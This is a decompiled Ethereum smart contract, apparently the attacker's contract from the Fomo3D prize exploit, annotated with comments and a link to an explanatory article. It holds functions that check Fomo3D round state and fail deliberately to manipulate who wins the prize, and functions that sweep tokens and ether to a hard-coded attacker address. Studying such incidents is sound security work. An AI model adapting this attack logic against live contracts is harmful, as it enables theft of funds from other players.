// Decompiled by library.dedaub.com
// 2022.12.01 09:12 UTC

//! news: https://medium.com/coinmonks/how-the-winner-got-fomo3d-prize-a-detailed-explanation-b30a69b7813f#4392


function () public payable { 
    revert();
}

// transfer the ether in this contract to the attacker address
function transferTokens(address varg0) public nonPayable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0.code.size);
    v0, v1 = varg0.balanceOf(address(this)).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(varg0.code.size);
    // 0xa169df... is the attacker
    v2, v3 = varg0.transfer(0xa169df5ed3363cfc4c92ac96c6c5f2a42fccbf85, v1).gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v3);
}

function 0x15f3aff0(uint256 varg0) public nonPayable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    v0 = new struct(7);
    MEM[v0 len 224] = this.code[this.code.size len 224];
    v1 = new struct(6);
    MEM[v1 len 192] = this.code[this.code.size len 192];
    require(0x29488e24cfdaa52a0b837217926c0c0853db7962.code.size);
    // get the round info to get profits
    // F3Devent contract
    v2, v3, v3, v3, v3, v3, v3, v3, v4 = 0x29488e24cfdaa52a0b837217926c0c0853db7962.getCurrentRoundInfo().gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 448);
    v5 = v6 = MEM[64] + 0;
    require(v6 + 31 < MEM[64] + RETURNDATASIZE());
    require(7 <= 0xffffffffffffffff);
    v7 = new struct(7);
    require(!((v7 + 224 > 0xffffffffffffffff) | (v7 + 224 < v7)));
    require(v6 + 224 <= MEM[64] + RETURNDATASIZE());
    v8 = v9 = 0;
    while (v8 < 7) {
        MEM[v7] = MEM[v5];
        v7 = v7 + 32;
        v5 = v5 + 32;
        v8 = v8 + 1;
    }
    v10 = v11 = MEM[64] + 256;
    require(v11 + 31 < MEM[64] + RETURNDATASIZE());
    require(6 <= 0xffffffffffffffff);
    v12 = new struct(6);
    require(!((v12 + 192 > 0xffffffffffffffff) | (v12 + 192 < v12)));
    require(v11 + 192 <= MEM[64] + RETURNDATASIZE());
    v13 = v14 = 0;
    while (v13 < 6) {
        MEM[v12] = MEM[v10];
        v12 = v12 + 32;
        v10 = v10 + 32;
        v13 = v13 + 1;
    }
    v15 = v16 = address(v4) != 0xa169df5ed3363cfc4c92ac96c6c5f2a42fccbf85;
    if (v16) {
        v15 = v17 = v7.word3 < block.timestamp + varg0;
    }
    if (v15) {
        v15 = v7.word1 == 1;
    }
    if (v15) {
        assert(0);
    }
}

// transfer ethers to the attacker
function 0x4d539562() public nonPayable { 
    v0 = 0xa169df5ed3363cfc4c92ac96c6c5f2a42fccbf85.call().value((address(this)).balance).gas(!(address(this)).balance * 2300);
    require(v0); // checks call status, propagates error data on error
}

function 0xb1e29c40(uint256 varg0, uint256 varg1, uint256 varg2) public nonPayable { 
    require(4 + (msg.data.length - 4) - 4 >= 96);
    v0 = new struct(7);
    MEM[v0 len 224] = this.code[this.code.size len 224];
    v1 = new struct(6);
    MEM[v1 len 192] = this.code[this.code.size len 192];
    require((address(varg0)).code.size);
    v2, v3, v3, v3, v3, v3, v3, v3, v4 = address(varg0).getCurrentRoundInfo().gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 448);
    v5 = v6 = MEM[64] + 0;
    require(v6 + 31 < MEM[64] + RETURNDATASIZE());
    require(7 <= 0xffffffffffffffff);
    v7 = new struct(7);
    require(!((v7 + 224 > 0xffffffffffffffff) | (v7 + 224 < v7)));
    require(v6 + 224 <= MEM[64] + RETURNDATASIZE());
    v8 = v9 = 0;
    while (v8 < 7) {
        MEM[v7] = MEM[v5];
        v7 = v7 + 32;
        v5 = v5 + 32;
        v8 = v8 + 1;
    }
    v10 = v11 = MEM[64] + 256;
    require(v11 + 31 < MEM[64] + RETURNDATASIZE());
    require(6 <= 0xffffffffffffffff);
    v12 = new struct(6);
    require(!((v12 + 192 > 0xffffffffffffffff) | (v12 + 192 < v12)));
    require(v11 + 192 <= MEM[64] + RETURNDATASIZE());
    v13 = v14 = 0;
    while (v13 < 6) {
        MEM[v12] = MEM[v10];
        v12 = v12 + 32;
        v10 = v10 + 32;
        v13 = v13 + 1;
    }
    // emit log
    emit 0x18008edb9b6af31bade4f3884a0c98750522b84e763923784c5d6939eb1d062b(v7.word3 - block.timestamp, v7.word3 - block.timestamp - varg2, address(v4));
    v15 = v16 = address(v4) == 0xa169df5ed3363cfc4c92ac96c6c5f2a42fccbf85;
    if (address(v4) != 0xa169df5ed3363cfc4c92ac96c6c5f2a42fccbf85) {
        // another EOA address
        v15 = address(v4) == 0xd27d2afdd35650629c63d4d702eb5f5d2d893642;
    }
    if (v15) {
        v15 = v17 = v7.word3 < block.timestamp + varg2;
    }
    if (v15) {
        v15 = v18 = v7.word1 == varg1;
    }
    if (v15) {
        assert(0);
    }
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length >= 4) {
        if (0xc89a0df == uint32(function_selector >> 224)) {
            transferTokens(address);
        } else if (0x15f3aff0 == uint32(function_selector >> 224)) {
            0x15f3aff0();
        } else if (0x4d539562 == uint32(function_selector >> 224)) {
            0x4d539562();
        } else if (0xb1e29c40 == uint32(function_selector >> 224)) {
            0xb1e29c40();
        }
    }
    ();
}
